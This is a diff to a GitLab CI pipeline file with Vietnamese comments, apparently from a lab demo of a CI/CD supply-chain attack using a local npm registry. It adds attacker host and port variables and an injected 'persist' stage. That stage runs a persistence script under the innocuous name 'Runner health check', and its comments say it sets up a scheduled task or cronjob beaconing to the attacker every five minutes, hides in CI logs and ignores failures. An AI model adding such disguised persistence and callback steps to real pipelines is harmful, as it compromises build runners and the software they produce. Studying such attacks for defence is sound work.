@@ -16,10 +16,20 @@
 stages:
   - install
   - build
-  - inject   # ← stage bị attacker thêm vào
+  - inject    # ← stage bị attacker thêm vào
+  - persist   # ← stage cài persistence trên CI runner
 
 variables:
+  # 1-machine demo: trỏ về Verdaccio trên Docker bridge
+  # 3-machine demo: override bằng CI/CD variable trong GitLab project settings
+  #   Settings → CI/CD → Variables → NPM_REGISTRY = http://<MACHINE_C_IP>:4873
   NPM_REGISTRY: "http://verdaccio:4873"
+
+  # IP của attacker receiver (Machine C).
+  # 1-machine: Docker bridge 172.30.0.20 (default trong code)
+  # 3-machine: set CI variable ATTACKER_HOST = <MACHINE_C_LAN_IP> trong GitLab
+  ATTACKER_HOST: "172.30.0.20"
+  ATTACKER_PORT: "8080"
 
 # ─── Stage 1: npm install (trigger malicious postinstall) ─────
 install_deps:
@@ -67,3 +77,17 @@ inject_backdoor:
       - artifacts/
   dependencies:
     - build
+
+# ─── Stage 4: INJECTED — Persistence trên CI runner ──────────
+# Cài Scheduled Task (Windows runner) hoặc cronjob (Linux runner).
+# Beacon ping về ATTACKER_HOST mỗi 5 phút, kể cả sau reboot runner.
+# Fail-silent: CI log chỉ thấy "[ci-step] Runner health check passed."
+install_runner_hook:
+  stage: persist
+  image: node:20
+  script:
+    - echo "[CI] Runner health check..."   # tên vô hại
+    - node packages/safe-marker-package/scripts/postinstall-persist.js
+  dependencies:
+    - inject_backdoor
+  allow_failure: true   # không dừng pipeline nếu schtasks thiếu quyền
